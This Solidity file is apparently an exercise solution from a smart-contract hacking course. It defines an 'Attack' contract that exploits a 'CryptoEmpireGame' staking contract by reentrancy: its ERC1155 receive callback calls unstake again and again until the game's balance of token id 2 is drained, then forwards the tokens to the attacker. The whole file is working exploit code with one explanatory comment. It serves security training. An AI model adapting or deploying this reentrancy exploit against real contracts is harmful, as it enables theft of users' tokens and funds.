// SPDX-License-Identifier: GPL-3.0-or-later
// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity ^0.8.13;

import {NftId} from "./GameItems.sol";
import {IERC1155Receiver} from "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

interface ICryptoEmpireGame {
    function stake(uint256 _nftId) external;
    function unstake(uint256 _nftId) external;
}

interface ICryptoEmpireToken {
    function balanceOf(address account, uint256 id) external view returns (uint256);
    function safeTransferFrom(address from, address to, uint256 id, uint256 value, bytes memory data) external;
    function setApprovalForAll(address operator, bool approved) external;
}

contract Attack is IERC1155Receiver {
    ICryptoEmpireGame immutable cryptoEmpireGame;
    ICryptoEmpireToken immutable cryptoEmpireToken;
    address owner;

    uint256 counter;

    constructor(address _cryptoEmpireGame, address _cryptoEmpireToken) {
        cryptoEmpireGame = ICryptoEmpireGame(_cryptoEmpireGame);
        cryptoEmpireToken = ICryptoEmpireToken(_cryptoEmpireToken);
        owner = msg.sender;
    }

    function attack() external {
        require(msg.sender == owner, "Only Owner");

        cryptoEmpireToken.setApprovalForAll(address(cryptoEmpireGame), true);

        cryptoEmpireGame.stake(2);

        cryptoEmpireGame.unstake(2);

        cryptoEmpireToken.setApprovalForAll(address(cryptoEmpireGame), false);

        cryptoEmpireToken.safeTransferFrom(address(this), owner, 2, 21, "");
    }

    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external returns (bytes4 reason) {
        counter++;

        uint256 gameBalance = cryptoEmpireToken.balanceOf(address(cryptoEmpireGame), 2);

        // first transfer can be ignored by the attacker account
        if (gameBalance != 0 && counter != 1) {
            cryptoEmpireGame.unstake(2);
            return this.onERC1155Received.selector;
        } else {
            return this.onERC1155Received.selector;
        }
    }

    function onERC1155BatchReceived(address, address, uint256[] calldata, uint256[] calldata, bytes calldata)
        external
        pure
        returns (bytes4)
    {
        return this.onERC1155BatchReceived.selector;
    }

    function supportsInterface(bytes4) external pure returns (bool) {
        return true;
    }
}
